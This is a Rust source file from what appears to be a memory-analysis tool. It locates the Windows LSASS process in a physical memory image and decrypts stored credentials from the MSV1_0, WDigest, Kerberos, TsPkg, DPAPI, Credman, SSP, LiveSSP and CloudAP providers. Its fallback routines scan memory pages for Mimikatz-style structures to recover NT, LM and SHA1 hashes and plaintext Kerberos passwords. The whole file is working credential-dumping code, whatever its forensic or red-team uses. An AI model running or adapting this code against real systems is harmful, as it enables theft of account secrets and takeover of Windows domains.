use crate::error::{GovmemError, Result};
use crate::lsass::crypto::{self, CryptoKeys};
use crate::lsass::types::{Credential, KerberosCredential, MsvCredential};
use crate::memory::{PhysicalMemory, VirtualMemory};
use crate::paging::translate::{PageTableWalker, ProcessMemory};
use crate::windows::offsets::X64_LDR;
use crate::windows::peb::{self, LoadedModule};
use crate::windows::process::Process;

/// DLLs loaded in LSASS that we need to locate.
pub struct LsassDlls {
    pub lsasrv: Option<LoadedModule>,
    pub msv1_0: Option<LoadedModule>,
    pub wdigest: Option<LoadedModule>,
    pub kerberos: Option<LoadedModule>,
    pub tspkg: Option<LoadedModule>,
    pub livessp: Option<LoadedModule>,
    pub cloudap: Option<LoadedModule>,
}

/// Pagefile reference type: wraps Option<&PagefileReader> when sam feature is enabled,
/// or () when not. Allows a unified function signature across feature configurations.
#[cfg(feature = "sam")]
pub type PagefileRef<'a> = Option<&'a crate::paging::pagefile::PagefileReader>;
#[cfg(not(feature = "sam"))]
pub type PagefileRef<'a> = ();

/// Disk path reference type: wraps Option<&Path> when sam feature is enabled,
/// or () when not. Allows a unified function signature across feature configurations.
#[cfg(feature = "sam")]
pub type DiskPathRef<'a> = Option<&'a std::path::Path>;
#[cfg(not(feature = "sam"))]
pub type DiskPathRef<'a> = ();

/// Find LSASS and extract all credentials.
/// When a pagefile reader is provided, paged-out memory is resolved from disk.
/// When a disk path is provided, demand-paged DLL sections are resolved from DLL files.
pub fn extract_all_credentials<P: PhysicalMemory>(
    phys: &P,
    lsass: &Process,
    _kernel_dtb: u64,
    pagefile: PagefileRef<'_>,
    disk_path: DiskPathRef<'_>,
) -> Result<Vec<Credential>> {
    // Create initial virtual memory reader for module enumeration
    #[cfg(feature = "sam")]
    let lsass_vmem_init = ProcessMemory::with_resolvers(phys, lsass.dtb, pagefile, None);
    #[cfg(not(feature = "sam"))]
    let lsass_vmem_init = {
        let _ = pagefile;
        let _ = disk_path;
        ProcessMemory::new(phys, lsass.dtb)
    };

    log::info!(
        "LSASS: PID={}, DTB=0x{:x}, PEB=0x{:x}",
        lsass.pid,
        lsass.dtb,
        lsass.peb_vaddr
    );

    // Enumerate DLLs in LSASS
    let modules = peb::enumerate_modules(&lsass_vmem_init, lsass.peb_vaddr, &X64_LDR)?;

    log::debug!("LSASS modules:");
    for m in &modules {
        log::debug!(
            "  0x{:016x} ({:8} bytes) {}",
            m.base,
            m.size,
            m.base_name
        );
    }

    // Build file-backed resolver from disk to serve demand-paged DLL sections
    #[cfg(feature = "sam")]
    let filebacked = disk_path.and_then(|p| {
        match crate::paging::filebacked::FileBackedResolver::from_disk_and_modules(p, &modules) {
            Ok(fb) if fb.section_count() > 0 => {
                log::info!(
                    "File-backed: {} sections, {:.1} MB from {} DLLs",
                    fb.section_count(),
                    fb.total_bytes() as f64 / (1024.0 * 1024.0),
                    modules.len()
                );
                Some(fb)
            }
            Ok(_) => {
                log::info!("File-backed: no DLL sections loaded from disk");
                None
            }
            Err(e) => {
                log::info!("File-backed resolver failed: {}", e);
                None
            }
        }
    });

    // Create enhanced vmem with file-backed resolution for DLL sections
    #[cfg(feature = "sam")]
    let lsass_vmem = ProcessMemory::with_resolvers(phys, lsass.dtb, pagefile, filebacked.as_ref());
    #[cfg(not(feature = "sam"))]
    let lsass_vmem = lsass_vmem_init;

    let dlls = LsassDlls {
        lsasrv: find_module(&modules, "lsasrv.dll"),
        msv1_0: find_module(&modules, "msv1_0.dll"),
        wdigest: find_module(&modules, "wdigest.dll"),
        kerberos: find_module(&modules, "kerberos.dll"),
        tspkg: find_module(&modules, "tspkg.dll"),
        livessp: find_module(&modules, "livessp.dll"),
        cloudap: find_module(&modules, "cloudap.dll"),
    };

    // Extract crypto keys from lsasrv.dll
    let lsasrv = dlls.lsasrv.as_ref().ok_or_else(|| {
        GovmemError::ProcessNotFound("lsasrv.dll not found in LSASS".to_string())
    })?;

    // Read Windows build number from KUSER_SHARED_DATA (always at VA 0x7FFE0000)
    let build_number = lsass_vmem
        .read_virt_u32(0x7FFE0260)
        .map(|v| v & 0xFFFF) // Low 16 bits = build number
        .unwrap_or(0);
    log::info!("Windows build number: {}", build_number);

    let keys = crypto::extract_crypto_keys(&lsass_vmem, lsasrv.base, lsasrv.size)?;

    // Extract credentials from each provider, tracking status for summary
    let mut all_creds: std::collections::HashMap<u64, Credential> = std::collections::HashMap::new();

    // Provider status: "ok", "paged", "empty", "n/a"
    let mut msv_status = "paged";
    let mut wdigest_status = "paged";
    let mut kerberos_status = "paged";
    let mut tspkg_status = "paged";
    let mut dpapi_status = "paged";
    let mut ssp_status = "empty";
    let mut livessp_status = if dlls.livessp.is_some() { "paged" } else { "n/a" };
    let mut credman_status = "paged";
    let mut cloudap_status = if dlls.cloudap.is_some() { "paged" } else { "n/a" };

    // MSV1_0
    if let Some(msv) = &dlls.msv1_0 {
        let msv_creds = match crate::lsass::msv::extract_msv_credentials(&lsass_vmem, msv.base, msv.size, &keys) {
            Ok(creds) if !creds.is_empty() => creds,
            Ok(_) => {
                // Standard extraction found nothing, try physical memory scan
                log::info!("MSV: Standard extraction found nothing, trying physical LUID scan...");
                scan_phys_for_msv_credentials(phys, lsass.dtb, &lsass_vmem, msv.base, msv.size, &keys)
            }
            Err(e) => {
                log::info!("MSV extraction failed: {}, trying physical scan...", e);
                scan_phys_for_msv_credentials(phys, lsass.dtb, &lsass_vmem, msv.base, msv.size, &keys)
            }
        };
        if !msv_creds.is_empty() {
            msv_status = "ok";
        }
        for (luid, msv_cred) in msv_creds {
            let entry = all_creds.entry(luid).or_insert_with(|| {
                Credential::new_empty(luid, msv_cred.username.clone(), msv_cred.domain.clone())
            });
            entry.msv = Some(msv_cred);
        }
    }

    // WDigest
    if let Some(wd) = &dlls.wdigest {
        match crate::lsass::wdigest::extract_wdigest_credentials(&lsass_vmem, wd.base, wd.size, &keys) {
            Ok(creds) => {
                if creds.is_empty() {
                    wdigest_status = "empty";
                } else {
                    wdigest_status = "ok";
                }
                for (luid, wd_cred) in creds {
                    let entry = all_creds.entry(luid).or_insert_with(|| {
                        Credential::new_empty(luid, wd_cred.username.clone(), wd_cred.domain.clone())
                    });
                    entry.wdigest = Some(wd_cred);
                }
            }
            Err(e) => log::info!("WDigest extraction failed: {}", e),
        }
    }

    // Kerberos
    if let Some(krb) = &dlls.kerberos {
        let krb_creds = match crate::lsass::kerberos::extract_kerberos_credentials(&lsass_vmem, krb.base, krb.size, &keys) {
            Ok(creds) if !creds.is_empty() => creds,
            Ok(_) | Err(_) => {
                log::info!("Kerberos: AVL table walk found nothing, trying physical scan...");
                // Build set of known user/domain pairs from already-discovered credentials
                let known_users: std::collections::HashSet<(String, String)> = all_creds.values()
                    .map(|c| (c.username.to_lowercase(), c.domain.to_lowercase()))
                    .collect();
                scan_phys_for_kerberos_credentials(phys, lsass.dtb, &lsass_vmem, &keys, &known_users)
            }
        };
        if !krb_creds.is_empty() {
            kerberos_status = "ok";
        }
        for (luid, krb_cred) in krb_creds {
            let entry = all_creds.entry(luid).or_insert_with(|| {
                Credential::new_empty(luid, krb_cred.username.clone(), krb_cred.domain.clone())
            });
            entry.kerberos = Some(krb_cred);
        }
    }

    // TsPkg
    if let Some(ts) = &dlls.tspkg {
        match crate::lsass::tspkg::extract_tspkg_credentials(&lsass_vmem, ts.base, ts.size, &keys) {
            Ok(creds) => {
                if creds.is_empty() {
                    tspkg_status = "empty";
                } else {
                    tspkg_status = "ok";
                }
                for (luid, ts_cred) in creds {
                    let entry = all_creds.entry(luid).or_insert_with(|| {
                        Credential::new_empty(luid, ts_cred.username.clone(), ts_cred.domain.clone())
                    });
                    entry.tspkg = Some(ts_cred);
                }
            }
            Err(e) => log::info!("TsPkg extraction failed: {}", e),
        }
    }

    // DPAPI (uses lsasrv.dll)
    match crate::lsass::dpapi::extract_dpapi_credentials(&lsass_vmem, lsasrv.base, lsasrv.size, &keys) {
        Ok(creds) => {
            if creds.is_empty() {
                dpapi_status = "empty";
            } else {
                dpapi_status = "ok";
            }
            for (luid, dpapi_cred) in creds {
                let entry = all_creds.entry(luid).or_insert_with(|| {
                    Credential::new_empty(luid, String::new(), String::new())
                });
                entry.dpapi.push(dpapi_cred);
            }
        }
        Err(e) => log::info!("DPAPI extraction failed: {}", e),
    }

    // Credman (uses msv1_0.dll - walks MSV logon session list for CredentialManager pointers)
    if let Some(msv) = &dlls.msv1_0 {
    match crate::lsass::credman::extract_credman_credentials(&lsass_vmem, msv.base, msv.size, &keys) {
        Ok(creds) => {
            if creds.is_empty() {
                credman_status = "empty";
            } else {
                credman_status = "ok";
            }
            for (luid, cm_cred) in creds {
                let entry = all_creds.entry(luid).or_insert_with(|| {
                    Credential::new_empty(luid, cm_cred.username.clone(), cm_cred.domain.clone())
                });
                entry.credman.push(cm_cred);
            }
        }
        Err(e) => log::info!("Credman extraction failed: {}", e),
    }
    }

    // SSP (uses msv1_0.dll)
    if let Some(msv) = &dlls.msv1_0 {
        match crate::lsass::ssp::extract_ssp_credentials(&lsass_vmem, msv.base, msv.size, &keys) {
            Ok(creds) => {
                if !creds.is_empty() {
                    ssp_status = "ok";
                }
                for (luid, ssp_cred) in creds {
                    let entry = all_creds.entry(luid).or_insert_with(|| {
                        Credential::new_empty(luid, ssp_cred.username.clone(), ssp_cred.domain.clone())
                    });
                    entry.ssp = Some(ssp_cred);
                }
            }
            Err(e) => log::debug!("SSP extraction: {}", e),
        }
    }

    // LiveSSP (uses livessp.dll, may not be loaded)
    if let Some(live) = &dlls.livessp {
        match crate::lsass::livessp::extract_livessp_credentials(&lsass_vmem, live.base, live.size, &keys) {
            Ok(creds) => {
                if creds.is_empty() {
                    livessp_status = "empty";
                } else {
                    livessp_status = "ok";
                }
                for (luid, live_cred) in creds {
                    let entry = all_creds.entry(luid).or_insert_with(|| {
                        Credential::new_empty(luid, live_cred.username.clone(), live_cred.domain.clone())
                    });
                    entry.livessp = Some(live_cred);
                }
            }
            Err(e) => log::info!("LiveSSP extraction failed: {}", e),
        }
    } else {
        log::info!("LiveSSP: livessp.dll not loaded in LSASS");
    }

    // CloudAP (uses cloudap.dll, may not be loaded)
    if let Some(cap) = &dlls.cloudap {
        match crate::lsass::cloudap::extract_cloudap_credentials(&lsass_vmem, cap.base, cap.size, &keys) {
            Ok(creds) => {
                if creds.is_empty() {
                    cloudap_status = "empty";
                } else {
                    cloudap_status = "ok";
                }
                for (luid, cap_cred) in creds {
                    let entry = all_creds.entry(luid).or_insert_with(|| {
                        Credential::new_empty(luid, cap_cred.username.clone(), cap_cred.domain.clone())
                    });
                    entry.cloudap = Some(cap_cred);
                }
            }
            Err(e) => log::info!("CloudAP extraction failed: {}", e),
        }
    } else {
        log::info!("CloudAP: cloudap.dll not loaded in LSASS");
    }

    // Print provider status summary
    println!(
        "[*] Providers: MSV({}) WDigest({}) Kerberos({}) TsPkg({}) DPAPI({}) SSP({}) LiveSSP({}) Credman({}) CloudAP({})",
        msv_status, wdigest_status, kerberos_status, tspkg_status, dpapi_status,
        ssp_status, livessp_status, credman_status, cloudap_status,
    );
    #[cfg(feature = "sam")]
    if let Some(fb) = &filebacked {
        let resolved = fb.pages_resolved();
        if resolved > 0 {
            println!("[+] File-backed: {} DLL pages resolved from disk", resolved);
        }
    }

    // Merge MSV credentials with unknown LUID (0) into matching credentials by username+domain
    if let Some(orphan) = all_creds.remove(&0) {
        if let Some(msv_cred) = orphan.msv {
            let key = (msv_cred.username.to_lowercase(), msv_cred.domain.to_lowercase());
            let mut merged = false;
            for cred in all_creds.values_mut() {
                let cred_key = (cred.username.to_lowercase(), cred.domain.to_lowercase());
                if cred_key == key {
                    cred.msv = Some(msv_cred.clone());
                    merged = true;
                    log::debug!(
                        "Merged MSV credential into LUID 0x{:x} (user='{}' domain='{}')",
                        cred.luid, cred.username, cred.domain
                    );
                    break;
                }
            }
            if !merged {
                // No matching credential found, keep as LUID=0
                all_creds.insert(0, Credential {
                    luid: 0,
                    username: msv_cred.username.clone(),
                    domain: msv_cred.domain.clone(),
                    logon_type: 0,
                    session_id: 0,
                    msv: Some(msv_cred),
                    wdigest: orphan.wdigest,
                    kerberos: orphan.kerberos,
                    tspkg: orphan.tspkg,
                    dpapi: orphan.dpapi,
                    credman: orphan.credman,
                    ssp: orphan.ssp,
                    livessp: orphan.livessp,
                    cloudap: orphan.cloudap,
                });
            }
        }
    }

    let mut result: Vec<Credential> = all_creds.into_values().collect();
    result.sort_by_key(|c| c.luid);
    Ok(result)
}

/// Scan LSASS physical pages for KIWI_MSV1_0_PRIMARY_CREDENTIALS structures.
///
/// Instead of trying to find LogonSessionList (which requires .text patterns that
/// are often paged out), we directly scan for the credential structure signature:
///   +0x00: next (PVOID, 0 or heap ptr)
///   +0x08: Primary (ANSI_STRING: Length=7, MaxLength=8 for "Primary")
///   +0x18: Credentials (UNICODE_STRING: encrypted blob)
///
/// The distinctive signature is bytes 07 00 08 00 at offset +0x08.
fn scan_phys_for_msv_credentials<P: PhysicalMemory>(
    phys: &P,
    lsass_dtb: u64,
    vmem: &impl VirtualMemory,
    _msv_base: u64,
    _msv_size: u32,
    keys: &CryptoKeys,
) -> Vec<(u64, MsvCredential)> {
    let walker = PageTableWalker::new(phys);
    let mut results = Vec::new();
    let mut pages_scanned = 0u64;
    let mut candidates_found = 0u64;

    log::info!("MSV physical scan: searching for Primary credential structures in LSASS pages...");

    // Collect all candidate (vaddr, paddr) pairs for KIWI_MSV1_0_PRIMARY_CREDENTIALS
    let mut cred_candidates: Vec<(u64, u64)> = Vec::new(); // (vaddr of struct, paddr)

    walker.enumerate_present_pages(lsass_dtb, |mapping| {
        if mapping.size != 0x1000 {
            return;
        }
        pages_scanned += 1;

        let page_data = match phys.read_phys_bytes(mapping.paddr, 0x1000) {
            Ok(d) => d,
            Err(_) => return,
        };

        // Skip zero pages
        if page_data.iter().all(|&b| b == 0) {
            return;
        }

        // Scan for ANSI_STRING signature: Length=7 (0x0007), MaxLength=8 (0x0008)
        // This appears at offset +0x08 in KIWI_MSV1_0_PRIMARY_CREDENTIALS
        // So we search for 07 00 08 00 at 8-byte aligned positions
        for off in (0..0x1000usize - 0x28).step_by(8) {
            // Check for 07 00 08 00 pattern
            if page_data[off] != 0x07 || page_data[off + 1] != 0x00
                || page_data[off + 2] != 0x08 || page_data[off + 3] != 0x00
            {
                continue;
            }

            // The KIWI_MSV1_0_PRIMARY_CREDENTIALS struct starts 0x08 bytes before this
            if off < 0x08 {
                continue;
            }
            let struct_off = off - 0x08;

            // Ensure enough room on page for the full structure header (0x28 bytes)
            if struct_off + 0x28 > 0x1000 {
                continue;
            }

            // Validate: next pointer at +0x00 should be 0 or a heap ptr
            let next = u64::from_le_bytes(
                page_data[struct_off..struct_off + 8].try_into().unwrap(),
            );
            if next != 0 && (next < 0x10000 || (next >> 48) != 0) {
                continue;
            }

            // Validate: ANSI_STRING.Buffer at +0x10 should be a heap ptr
            let buf_ptr = u64::from_le_bytes(
                page_data[struct_off + 0x10..struct_off + 0x18].try_into().unwrap(),
            );
            if buf_ptr < 0x10000 || (buf_ptr >> 48) != 0 {
                continue;
            }

            // Validate: Credentials UNICODE_STRING at +0x18
            let cred_len = u16::from_le_bytes(
                page_data[struct_off + 0x18..struct_off + 0x1A].try_into().unwrap(),
            ) as usize;
            let cred_max_len = u16::from_le_bytes(
                page_data[struct_off + 0x1A..struct_off + 0x1C].try_into().unwrap(),
            ) as usize;
            let cred_buf = u64::from_le_bytes(
                page_data[struct_off + 0x20..struct_off + 0x28].try_into().unwrap(),
            );

            // Encrypted credentials must be non-zero length, reasonable size, even length
            if cred_len == 0 || cred_len > 0x400 || cred_max_len < cred_len {
                continue;
            }
            // Buffer must be a valid heap pointer
            if cred_buf < 0x10000 || (cred_buf >> 48) != 0 {
                continue;
            }

            let struct_vaddr = mapping.vaddr + struct_off as u64;
            let struct_paddr = mapping.paddr + struct_off as u64;
            candidates_found += 1;

            log::debug!(
                "MSV phys-scan: Primary credential candidate at VA 0x{:x} (PA 0x{:x}): \
                 next=0x{:x}, ANSI buf=0x{:x}, enc_len={}, enc_buf=0x{:x}",
                struct_vaddr, struct_paddr, next, buf_ptr, cred_len, cred_buf
            );

            cred_candidates.push((struct_vaddr, struct_paddr));
        }
    });

    log::info!(
        "MSV physical scan: {} pages scanned, {} Primary credential candidates found",
        pages_scanned, candidates_found
    );

    // Process each candidate, deduplicating by encrypted data content
    let mut seen_enc_data: std::collections::HashSet<Vec<u8>> = std::collections::HashSet::new();
    for (vaddr, _paddr) in &cred_candidates {
        // Deduplicate: read first 32 bytes of encrypted data and skip if already seen
        let enc_size = vmem.read_virt_u16(*vaddr + 0x18).unwrap_or(0) as usize;
        let enc_buf = vmem.read_virt_u64(*vaddr + 0x20).unwrap_or(0);
        if enc_size > 0 && enc_buf > 0x10000 {
            let sample_len = std::cmp::min(enc_size, 32);
            if let Ok(sample) = vmem.read_virt_bytes(enc_buf, sample_len) {
                if !seen_enc_data.insert(sample) {
                    log::debug!("  VA 0x{:x}: duplicate encrypted content, skipping", vaddr);
                    continue;
                }
            }
        }
        // Try to verify "Primary" string
        let ansi_buf = vmem.read_virt_u64(*vaddr + 0x10).unwrap_or(0);
        if ansi_buf != 0 {
            if let Ok(primary_bytes) = vmem.read_virt_bytes(ansi_buf, 7) {
                if primary_bytes != b"Primary" {
                    log::debug!(
                        "  VA 0x{:x}: ANSI string is '{}', not 'Primary' - skipping",
                        vaddr,
                        String::from_utf8_lossy(&primary_bytes)
                    );
                    continue;
                }
                log::debug!("  VA 0x{:x}: Confirmed 'Primary' ANSI string", vaddr);
            }
            // If we can't read the string (paged out), still try extraction
        }

        // Extract encrypted credentials
        match crate::lsass::msv::try_extract_primary_credential(vmem, *vaddr, keys) {
            Ok(cred) => {
                // Check if the hash is non-zero (not empty)
                if cred.nt_hash == [0u8; 16] {
                    log::debug!("  VA 0x{:x}: NT hash is all zeros, skipping", vaddr);
                    continue;
                }

                // Try to get username/domain from the decrypted credential blob
                // The MSV1_0_PRIMARY_CREDENTIAL contains:
                //   +0x00: LogonDomainName (UNICODE_STRING embedded)
                //   +0x10: UserName (UNICODE_STRING embedded)
                // But these are inside the encrypted blob, so read from the blob
                let (username, domain) = extract_username_from_cred_blob(vmem, *vaddr, keys);

                log::info!(
                    "MSV credential (phys scan): user='{}' domain='{}' NT={}",
                    username, domain, hex::encode(cred.nt_hash)
                );
                results.push((
                    0, // LUID unknown from this approach
                    MsvCredential {
                        username,
                        domain,
                        lm_hash: cred.lm_hash,
                        nt_hash: cred.nt_hash,
                        sha1_hash: cred.sha1_hash,
                    },
                ));
            }
            Err(e) => {
                log::debug!("  VA 0x{:x}: credential extraction failed: {}", vaddr, e);
            }
        }
    }

    results
}

/// Extract username and domain from the decrypted MSV1_0_PRIMARY_CREDENTIAL blob.
/// The blob starts with:
///   +0x00: LogonDomainName (UNICODE_STRING: Length u16, MaxLength u16, pad u32, Buffer u64)
///   +0x10: UserName (UNICODE_STRING: Length u16, MaxLength u16, pad u32, Buffer u64)
///
/// The Buffer field is an OFFSET into the decrypted blob (not a VA), because
/// the entire credential is encrypted as a contiguous block.
fn extract_username_from_cred_blob(
    vmem: &impl VirtualMemory,
    cred_struct_ptr: u64,
    keys: &CryptoKeys,
) -> (String, String) {
    let enc_size = match vmem.read_virt_u16(cred_struct_ptr + 0x18) {
        Ok(s) => s as usize,
        Err(_) => return (String::new(), String::new()),
    };
    if enc_size == 0 || enc_size > 0x400 {
        return (String::new(), String::new());
    }
    let enc_ptr = match vmem.read_virt_u64(cred_struct_ptr + 0x20) {
        Ok(p) => p,
        Err(_) => return (String::new(), String::new()),
    };
    if enc_ptr == 0 {
        return (String::new(), String::new());
    }
    let enc_data = match vmem.read_virt_bytes(enc_ptr, enc_size) {
        Ok(d) => d,
        Err(_) => return (String::new(), String::new()),
    };
    let decrypted = match crate::lsass::crypto::decrypt_credential(keys, &enc_data) {
        Ok(d) => d,
        Err(_) => return (String::new(), String::new()),
    };

    if decrypted.len() < 0x20 {
        return (String::new(), String::new());
    }

    // Parse UNICODE_STRINGs from decrypted blob
    let domain_len = u16::from_le_bytes([decrypted[0], decrypted[1]]) as usize;
    let user_len = u16::from_le_bytes([decrypted[0x10], decrypted[0x11]]) as usize;

    // Buffer field: could be an offset into the blob OR a VA in LSASS
    let domain_buf_raw = u64::from_le_bytes(
        decrypted[0x08..0x10].try_into().unwrap_or([0; 8]),
    );
    let user_buf_raw = u64::from_le_bytes(
        decrypted[0x18..0x20].try_into().unwrap_or([0; 8]),
    );

    // Read domain string
    let domain = read_embedded_unicode_string(
        &decrypted, domain_buf_raw, domain_len, vmem,
    );

    // Read username string
    let username = read_embedded_unicode_string(
        &decrypted, user_buf_raw, user_len, vmem,
    );

    (username, domain)
}

/// Read a UNICODE_STRING from either the decrypted blob (if Buffer is an offset)
/// or from LSASS virtual memory (if Buffer is a VA).
fn read_embedded_unicode_string(
    blob: &[u8],
    buf_raw: u64,
    byte_len: usize,
    vmem: &impl VirtualMemory,
) -> String {
    if byte_len == 0 || byte_len > 0x200 {
        return String::new();
    }

    // If buf_raw is small enough to be an offset into the blob, read from blob
    if (buf_raw as usize) + byte_len <= blob.len() {
        let start = buf_raw as usize;
        let data = &blob[start..start + byte_len];
        let u16s: Vec<u16> = data
            .chunks_exact(2)
            .map(|c| u16::from_le_bytes([c[0], c[1]]))
            .take_while(|&c| c != 0)
            .collect();
        return String::from_utf16_lossy(&u16s);
    }

    // Otherwise treat as VA in LSASS memory
    if buf_raw > 0x10000 && (buf_raw >> 48) == 0 {
        return vmem
            .read_win_unicode_string_raw(buf_raw, byte_len)
            .unwrap_or_default();
    }

    String::new()
}

/// Scan LSASS physical pages for KIWI_KERBEROS_PRIMARY_CREDENTIAL_1607 structures.
///
/// Layout:
///   +0x00: UserName   (UNICODE_STRING: Length u16, MaxLength u16, pad u32, Buffer u64)
///   +0x10: DomainName (UNICODE_STRING: same layout)
///   +0x20: unk0       (PVOID, 8 bytes)
///   +0x28: unk_pad    (8 bytes)
///   +0x30: Password   (UNICODE_STRING: encrypted)
///
/// The scan validates that +0x20..+0x30 does NOT look like another UNICODE_STRING
/// (to distinguish from arrays of UNICODE_STRINGs in memory).
/// Only credentials whose user/domain match already-known logon sessions are returned.
fn scan_phys_for_kerberos_credentials<P: PhysicalMemory>(
    phys: &P,
    lsass_dtb: u64,
    vmem: &impl VirtualMemory,
    keys: &CryptoKeys,
    known_users: &std::collections::HashSet<(String, String)>,
) -> Vec<(u64, KerberosCredential)> {
    let walker = PageTableWalker::new(phys);
    let mut results = Vec::new();
    let mut pages_scanned = 0u64;
    let mut candidates_found = 0u64;

    log::info!("Kerberos physical scan: searching for credential structures in LSASS pages...");

    let mut cred_candidates: Vec<u64> = Vec::new();

    walker.enumerate_present_pages(lsass_dtb, |mapping| {
        if mapping.size != 0x1000 {
            return;
        }
        pages_scanned += 1;

        let page_data = match phys.read_phys_bytes(mapping.paddr, 0x1000) {
            Ok(d) => d,
            Err(_) => return,
        };

        if page_data.iter().all(|&b| b == 0) {
            return;
        }

        // Need at least 0x40 bytes (up to Password buffer pointer at +0x38).
        for off in (0..0x1000usize - 0x40).step_by(8) {
            // --- UserName UNICODE_STRING at +0x00 ---
            let user_len = u16::from_le_bytes(
                page_data[off..off + 2].try_into().unwrap(),
            ) as usize;
            let user_max = u16::from_le_bytes(
                page_data[off + 2..off + 4].try_into().unwrap(),
            ) as usize;
            let user_pad = u32::from_le_bytes(
                page_data[off + 4..off + 8].try_into().unwrap(),
            );
            let user_buf = u64::from_le_bytes(
                page_data[off + 8..off + 16].try_into().unwrap(),
            );

            if user_len == 0 || user_len > 100 || !user_len.is_multiple_of(2) {
                continue;
            }
            if user_max < user_len || user_max > 0x200 || user_pad != 0 {
                continue;
            }
            if user_buf < 0x10000 || (user_buf >> 48) != 0 {
                continue;
            }

            // --- DomainName UNICODE_STRING at +0x10 ---
            let dom_len = u16::from_le_bytes(
                page_data[off + 0x10..off + 0x12].try_into().unwrap(),
            ) as usize;
            let dom_max = u16::from_le_bytes(
                page_data[off + 0x12..off + 0x14].try_into().unwrap(),
            ) as usize;
            let dom_pad = u32::from_le_bytes(
                page_data[off + 0x14..off + 0x18].try_into().unwrap(),
            );
            let dom_buf = u64::from_le_bytes(
                page_data[off + 0x18..off + 0x20].try_into().unwrap(),
            );

            if dom_len == 0 || dom_len > 100 || !dom_len.is_multiple_of(2) {
                continue;
            }
            if dom_max < dom_len || dom_max > 0x200 || dom_pad != 0 {
                continue;
            }
            if dom_buf < 0x10000 || (dom_buf >> 48) != 0 {
                continue;
            }

            // Try both Win10 1607+ layout (gap at +0x20, Password at +0x30)
            // and Win7/8/Win10-1507 layout (Password at +0x28, no gap).
            // For Win10 1607+, +0x20 is unk0 PVOID, not a UNICODE_STRING.
            // For Win7/8, +0x20 IS the Password UNICODE_STRING (or at +0x28).
            let mut found_pwd = false;
            for &pwd_off in &[0x30u64, 0x28] {
                let po = pwd_off as usize;
                if off + po + 0x10 > 0x1000 {
                    continue;
                }

                let pwd_len = u16::from_le_bytes(
                    page_data[off + po..off + po + 2].try_into().unwrap(),
                ) as usize;
                let pwd_max = u16::from_le_bytes(
                    page_data[off + po + 2..off + po + 4].try_into().unwrap(),
                ) as usize;
                let pwd_pad = u32::from_le_bytes(
                    page_data[off + po + 4..off + po + 8].try_into().unwrap(),
                );
                let pwd_buf = u64::from_le_bytes(
                    page_data[off + po + 8..off + po + 16].try_into().unwrap(),
                );

                if pwd_len == 0 || pwd_len > 0x200 || pwd_max < pwd_len || pwd_pad != 0 {
                    continue;
                }
                if pwd_buf < 0x10000 || (pwd_buf >> 48) != 0 {
                    continue;
                }

                // All buffer pointers should be in a similar heap region
                let min_buf = user_buf.min(dom_buf).min(pwd_buf);
                let max_buf = user_buf.max(dom_buf).max(pwd_buf);
                if max_buf - min_buf > 0x100000 {
                    continue;
                }

                found_pwd = true;
                break;
            }
            if !found_pwd {
                continue;
            }

            let struct_vaddr = mapping.vaddr + off as u64;
            candidates_found += 1;
            cred_candidates.push(struct_vaddr);
        }
    });

    log::info!(
        "Kerberos physical scan: {} pages scanned, {} candidates found",
        pages_scanned, candidates_found
    );

    // Process candidates: validate against known users and try decryption
    let mut seen: std::collections::HashSet<(String, String)> = std::collections::HashSet::new();

    for vaddr in &cred_candidates {
        let username = vmem.read_win_unicode_string(*vaddr).unwrap_or_default();
        let domain = vmem.read_win_unicode_string(*vaddr + 0x10).unwrap_or_default();

        if username.is_empty() || domain.is_empty() {
            continue;
        }

        // Only accept credentials that match known logon sessions (from MSV/WDigest)
        let key = (username.to_lowercase(), domain.to_lowercase());
        if !known_users.contains(&key) {
            continue;
        }

        if !seen.insert(key) {
            continue;
        }

        // Try to decrypt the password (try Win10 1607+ offset first, then older)
        let password = crate::lsass::kerberos::extract_kerb_password(vmem, *vaddr, 0x30, keys)
            .or_else(|_| crate::lsass::kerberos::extract_kerb_password(vmem, *vaddr, 0x28, keys))
            .unwrap_or_default();

        log::info!(
            "Kerberos credential (phys scan): user='{}' domain='{}' password_len={}",
            username, domain, password.len()
        );

        results.push((
            0, // LUID unknown from physical scan
            KerberosCredential {
                username,
                domain,
                password,
                tickets: Vec::new(),
            },
        ));
    }

    results
}

fn find_module(modules: &[LoadedModule], name: &str) -> Option<LoadedModule> {
    modules.iter().find(|m| m.base_name.eq_ignore_ascii_case(name)).map(|m| LoadedModule {
        base: m.base,
        size: m.size,
        full_name: m.full_name.clone(),
        base_name: m.base_name.clone(),
    })
}
